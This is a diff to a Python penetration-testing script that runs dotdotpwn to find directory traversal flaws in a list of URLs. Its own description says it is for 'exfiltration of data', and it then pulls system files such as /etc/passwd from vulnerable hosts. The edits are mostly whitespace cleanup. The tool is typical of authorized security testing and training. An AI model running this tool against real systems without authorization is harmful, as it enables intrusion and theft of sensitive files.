@@ -14,7 +14,7 @@ from multiprocessing import Process, Queue
 import requests
 import time
 from shutil import move
-    
+
 #This function currently runs regular and an extension web scans using ddpwn on a list of URLs
 #If something is found, it will output the result to the /dirb/ directory
 def dotPwn(URL):
@@ -45,7 +45,6 @@ def dotPwn(URL):
 #	-C	Continue if no data was received from host
     port, resultsOut, baseURL, URL = parseURL(URL)
     konfirmString = setDotPwnOptions()
-    print "INFO: Starting Dotdotpwn"
     if ("TRAVERSAL" in URL):
         DOTPWN = 'dotdotpwn.pl -m http-url -u %s -k %s -d %s -o %s -x %s -t 1 -q -C -b' % (URL, konfirmString, args.depth, args.os, port)
         DOTPWNE = 'dotdotpwn.pl -m http-url -u %s -k %s -d %s -o %s -x %s -t 1 -e %s -q -C -b' % (URL, konfirmString, args.depth, args.os, port, args.extensions)
@@ -53,17 +52,17 @@ def dotPwn(URL):
         DOTPWN = 'dotdotpwn.pl -m http -h %s -k %s -d %s -o %s -x %s -t 1 -q -C -b' % (baseURL, konfirmString, args.depth, args.os, port)
         DOTPWNE = 'dotdotpwn.pl -m http -h %s -k %s -d %s -o %s -x %s -t 1 -e %s -q -C -b' % (baseURL, konfirmString, args.depth, args.os, port, args.extensions)
     try:
-        DOTPWNRESULTS = subprocess.check_output(DOTPWN, shell=True)      
+        DOTPWNRESULTS = subprocess.check_output(DOTPWN, shell=True)
     except CalledProcessError as ex:
         writeOutputFile = True
         text = ex.output.split("\n")
         for line in text:
             if ("[+] Total Traversals found: 0" == line):
                 print "INFO: No traversals found for %s" % URL
-                writeOutputFile = False     
+                writeOutputFile = False
             if ("<- VULNERABLE" in line):
-                vuln.append(line)  
-        if (writeOutputFile):    
+                vuln.append(line)
+        if (writeOutputFile):
             try:
                 outfile = "/root/scripts/recon_enum/results/exam/dotdotpwn/%s" % resultsOut
                 print "INFO: Traversals found! See %s" % outfile
@@ -74,17 +73,17 @@ def dotPwn(URL):
                 raise
     if (len(vuln) == 0): #don't run extension scan if we already have a vuln
         try:
-            DOTPWNERESULTS = subprocess.check_output(DOTPWNE, shell=True)       
-        except CalledProcessError as fx: 
-            writeOutputFile = True 
+            DOTPWNERESULTS = subprocess.check_output(DOTPWNE, shell=True)
+        except CalledProcessError as fx:
+            writeOutputFile = True
             textE = fx.output.split("\n")
             for line in textE:
                 if ("[+] Total Traversals found: 0" == line):
                     print "INFO: No traversals found for %s using file extensions" % URL
                     writeOutputFile = False
                 if ("<- VULNERABLE" in line):
-                    vuln.append(line)        
-            if (writeOutputFile):    
+                    vuln.append(line)
+            if (writeOutputFile):
                 try:
                     outfile = "/root/scripts/recon_enum/results/exam/dotdotpwn/E%s" % resultsOut
                     print "INFO: Traversals found using extensions! See %s" % outfile
@@ -96,8 +95,8 @@ def dotPwn(URL):
     if (args.scan_and_retrieve and len(vuln) > 0):
         print "INFO: Downloading files"
         retrieve()
-    
-#grab pieces to build URL, feed in files to grab,     
+
+#grab pieces to build URL, feed in files to grab,
 def retrieve():
     vulnURLs = analyzeVuln(vuln)
     tmp = vulnURLs[0]
@@ -217,7 +216,7 @@ def sortEverythingElse():
 
 ##1, grab port
 ##2, output file cannot have "/" in filename
-##3, grab base url, http module doesn't like http:// 
+##3, grab base url, http module doesn't like http://
 ##4, file has \n causing errors in query, strip those
 def parseURL(url):
     tmp = url.split(":")
@@ -230,7 +229,7 @@ def parseURL(url):
         elif ("http" == tmp[0]):
             port = "80"
     if (len(tmp) > 3): #this should never happen
-        port = "80" 
+        port = "80"
     try:
         resultsOut = url.split("/")[2] + url.split("/")[3]
     except:
@@ -249,7 +248,7 @@ def setDotPwnOptions():
     if (args.os == "windows"):
         konfirmString = '"[fonts]"'
     return konfirmString
-    
+
 
 #will return values to build a string like base+page+pre+path+encodedsplit+userrequestfile+suffix
 #let base = IP:Port/
@@ -273,7 +272,7 @@ def analyzeVuln(vulnar):
             vulnProto = "https://"
             vulnBase = tmp.split("https://")[1]
         vulnPagetmp = vulnBase.split("/",1)[1]
-        vulnBase = vulnBase.split("/",1)[0]       
+        vulnBase = vulnBase.split("/",1)[0]
         vulnBase = vulnBase + "/"
         #print "DEBUG: vulnBase %s" % vulnBase
         #print "DEBUG: vulnPagetmp: %s" % vulnPagetmp
@@ -288,7 +287,7 @@ def analyzeVuln(vulnar):
             vulnStringPrefixtmp = vulnPagetmp.split("/",2)[len(vulnPagetmp.split("/",2))-1]
             #print "DEBUG: vulnStringPrefixtmp: %s" %vulnStringPrefixtmp
         if (args.os == 'unix'): #looking for passwd and issue, user specified file not available yet
-            vulnStringPrefix = vulnStringPrefixtmp.split("etc")[0]  
+            vulnStringPrefix = vulnStringPrefixtmp.split("etc")[0]
             encodedSplittmp = vulnStringPrefixtmp.split("etc")[1]
             if ("passwd" in vulnStringPrefixtmp):
                 vulnStringSuffix = vulnStringPrefixtmp.split("passwd")[1]
@@ -299,7 +298,7 @@ def analyzeVuln(vulnar):
                         encodedSplit = encodedSplit + c
             if ("issue" in vulnStringPrefixtmp):
                 vulnStringSuffix = vulnStringPrefixtmp.split("issue")[1]
-                for c in encodedSplittmp: 
+                for c in encodedSplittmp:
                     if (c == "p"):
                         break
                     else:
@@ -312,7 +311,7 @@ def analyzeVuln(vulnar):
         print vals
         final.append(vals)
     return final
-    
+
 if __name__=='__main__':
 
     parser = argparse.ArgumentParser(description='Rough script to handle discovery of and exfiltration of data through directory traversal. Recommend invoke with: dirTrav <URLs> <os> -sr')
@@ -323,7 +322,7 @@ if __name__=='__main__':
     parser.add_argument('-s', '--scan', action="store_true", dest="scan", default="true", help="scan the target for directory traversal")
     parser.add_argument('-sr', '--scan-and-retrieve', nargs='?', const='true', default='false', dest="scan_and_retrieve", help="scan and retrieve files if a directory traversal is found")
     parser.add_argument('-x', '--xfil-files', type=str, action="store", dest="xfil_files", default="/root/lists/Personal/DirTrav/linux_all.txt", help="list of files to retrieve if a directory traversal vulnerability is found. Default is linux_all.txt.")
-    
+
     args = parser.parse_args()
     #print args
     vuln = []
@@ -336,11 +335,12 @@ if __name__=='__main__':
 		if ("windows_all.txt" in args.xfil_files):
 			print "Error: Will not retrieve windows files from Linux. Set os to Windows or pass a file with Linux files to -x"
 			raise
-    
+
     if (args.scan):
         try:
             inputFile = open(inputFileName,'r')
             jobs = []
+            print "INFO: Starting Dotdotpwn"
             for URL in inputFile:
                 if ("\n" in URL):
                     URL = URL[:-1]
